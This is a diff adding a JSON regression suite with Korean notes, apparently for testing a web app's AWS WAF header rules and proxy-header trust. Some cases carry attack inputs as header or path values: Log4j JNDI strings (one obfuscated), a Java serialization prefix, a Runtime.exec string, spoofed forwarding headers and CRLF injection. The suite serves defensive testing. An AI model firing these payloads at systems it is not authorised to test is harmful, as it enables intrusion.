@@ -1,0 +1,302 @@
+{
+  "schema_version": 1,
+  "suite_id": "haven-aws-header-001",
+  "suite_kind": "regression",
+  "cases": [
+    {
+      "case_id": "HDR-FP-BROWSER-UA",
+      "phase": 3,
+      "category": "waf_fp",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": "정상: 일반 Chrome User-Agent. WAF 규칙 매칭 없어야 함"
+    },
+    {
+      "case_id": "HDR-FP-REFERER",
+      "phase": 3,
+      "category": "waf_fp",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Referer": "https://www.google.com/search?q=haven+diary+login"
+      },
+      "note": "정상: 검색엔진 Referer. 매칭 없어야 함"
+    },
+    {
+      "case_id": "HDR-LOG4J-UA",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "${jndi:ldap://haven-waf-test.invalid/a}"
+      },
+      "note": "KnownBadInputs: User-Agent에 Log4j 문자열(실제 접속 불가한 .invalid 주소)"
+    },
+    {
+      "case_id": "HDR-LOG4J-XAPI",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-Api-Version": "${jndi:dns://haven-waf-test.invalid/b}"
+      },
+      "note": "KnownBadInputs: 임의 헤더에 Log4j 문자열"
+    },
+    {
+      "case_id": "HDR-LOG4J-OBFUSCATED",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "${${lower:j}ndi:${lower:l}dap://haven-waf-test.invalid/c}"
+      },
+      "note": "우회: Log4j 난독화(lower 함수) 문자열. 미탐 여부 확인"
+    },
+    {
+      "case_id": "HDR-JAVA-DESER-B64",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-Api-Version": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwAC"
+      },
+      "note": "KnownBadInputs 범위 확인: 헤더에 Java 직렬화 객체 시작 문자열(base64). 1차 실행에서 미매칭"
+    },
+    {
+      "case_id": "HDR-JAVA-RUNTIME",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-Api-Version": "(java.lang.Runtime).getRuntime().exec(\"haven-waf-test\")"
+      },
+      "note": "KnownBadInputs: 헤더에 Java 런타임 실행 문자열(AWS 문서 예시 형태, 실행되지 않음)"
+    },
+    {
+      "case_id": "HDR-HOST-LOCALHOST",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 400
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Host": "localhost"
+      },
+      "note": "KnownBadInputs: Host가 localhost. 앱은 허용하지 않은 Host로 400 예상"
+    },
+    {
+      "case_id": "HDR-BADBOT-UA",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Nmap Scripting Engine; https://nmap.org/book/nse.html"
+      },
+      "note": "Common: 스캐너 User-Agent"
+    },
+    {
+      "case_id": "HDR-NO-UA",
+      "phase": 3,
+      "category": "waf_header",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": null
+      },
+      "note": "Common: User-Agent 없음(팀 점검 스크립트와 같은 형태)"
+    },
+    {
+      "case_id": "SEC-55-XFP-HTTP",
+      "phase": 3,
+      "category": "proxy_trust",
+      "method": "GET",
+      "path": "/posts/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 302,
+        "redirect_path": "/accounts/login/"
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-Forwarded-Proto": "http"
+      },
+      "note": "SEC-55: 클라이언트가 X-Forwarded-Proto: http를 보내도 HTTPS 판단·로그인 이동이 그대로인지"
+    },
+    {
+      "case_id": "SEC-55-XFH-EVIL",
+      "phase": 3,
+      "category": "proxy_trust",
+      "method": "GET",
+      "path": "/posts/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 302,
+        "redirect_path": "/accounts/login/"
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-Forwarded-Host": "haven-evil.invalid"
+      },
+      "note": "SEC-55: X-Forwarded-Host 조작이 이동 주소에 반영되지 않는지(같은 origin의 /accounts/login/)"
+    },
+    {
+      "case_id": "SEC-55-XFF-SPOOF",
+      "phase": 3,
+      "category": "proxy_trust",
+      "method": "GET",
+      "path": "/accounts/login/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-Forwarded-For": "127.0.0.1"
+      },
+      "note": "SEC-55: 가짜 X-Forwarded-For. Nginx client=·앱 IP 기록이 실제 접속 IP 기준인지 로그로 확인"
+    },
+    {
+      "case_id": "SEC-08-QUERY-CRLF",
+      "phase": 3,
+      "category": "header_injection",
+      "method": "GET",
+      "path": "/accounts/login/?next=%0d%0aSet-Cookie:%20haven_crlf=1",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 200
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": "SEC-08: 쿼리에 CRLF. 응답 헤더에 Set-Cookie: haven_crlf가 생기지 않아야 함"
+    },
+    {
+      "case_id": "SEC-08-PATH-CRLF",
+      "phase": 3,
+      "category": "header_injection",
+      "method": "GET",
+      "path": "/posts/%0d%0aX-Haven-Injected:%201/",
+      "auth_role": "anonymous",
+      "input_reference": null,
+      "expected_app": {
+        "http_status": 404
+      },
+      "expected_waf": "NOT_APPLICABLE",
+      "max_requests": 1,
+      "verification_mode": "manual_required",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": "SEC-08: 경로에 CRLF. 응답 헤더 X-Haven-Injected 없음, 404"
+    }
+  ]
+}
